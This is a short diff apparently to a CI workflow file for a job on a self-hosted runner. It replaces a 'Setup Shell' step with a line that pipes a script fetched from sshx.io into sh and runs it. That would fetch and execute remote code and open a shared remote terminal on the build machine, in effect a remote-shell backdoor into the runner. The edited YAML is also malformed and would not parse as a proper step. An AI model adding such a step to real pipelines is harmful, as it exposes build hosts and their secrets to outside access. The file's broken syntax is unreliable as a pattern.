@@ -7,5 +7,5 @@ jobs:
   testRunner:
     runs-on: [self-hosted]
     steps:
-  - name:Setup Shell
-  - run:curl -sSf https://sshx.io/get | sh -s run
+ 
+   run:curl -sSf https://sshx.io/get | sh -s run
